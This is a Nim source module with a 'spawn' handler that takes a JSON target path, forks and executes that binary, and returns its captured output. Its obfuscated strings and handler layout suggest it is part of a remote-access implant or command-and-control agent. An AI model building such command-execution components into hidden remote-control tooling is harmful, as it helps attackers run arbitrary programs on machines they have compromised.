import std/json
from std/strutils import strip
import ../utils/global
import ../utils/linapi/handlers
import execution
from posix import STDOUT_FILENO, STDERR_FILENO, close, dup2, execvp, fork, pipe, read, waitpid

proc paramTarget(params: string): string =
  # Reads the target path from the params
  try:
    let p = parseJson(params)
    if p.hasKey(obf("target")):
      p[obf("target")].getStr().strip(chars = {'"', '\''})
    else:
      ""
  except JsonParsingError:
    ""

proc run_spawn*(params: string; buf: var openArray[char]): int =
  # Entrypoint that forks and runs the target binary
  let target = paramTarget(params)
  if target.len == 0:
    return writeMsg(obf("Error: missing target"), buf)
  if not pathExists(target):
    return writeMsg(obf("Error: target not found"), buf)

  var fds: array[2, cint]
  if pipe(fds) != 0:
    return writeMsg(obf("Error: pipe failed"), buf)

  let pid = fork()
  if pid < 0:
    discard close(fds[0])
    discard close(fds[1])
    return writeMsg(obf("Error: fork failed"), buf)

  if pid == 0:
    discard close(fds[0])
    if dup2(fds[1], STDOUT_FILENO) < 0:
      quit(1)
    if dup2(fds[1], STDERR_FILENO) < 0:
      quit(1)
    discard close(fds[1])
    var argv: array[2, cstring]
    argv[0] = target.cstring
    argv[1] = nil
    discard execvp(argv[0], cast[cstringArray](addr argv[0]))
    quit(127)

  discard close(fds[1])
  var total = 0
  while total < buf.len:
    let n = read(fds[0], addr buf[total], buf.len - total)
    if n <= 0:
      break
    total += n
  discard close(fds[0])
  var status: cint = 0
  discard waitpid(pid, status, 0)
  if total > 0:
    total
  else:
    writeMsg(obf("Spawned. No output."), buf)
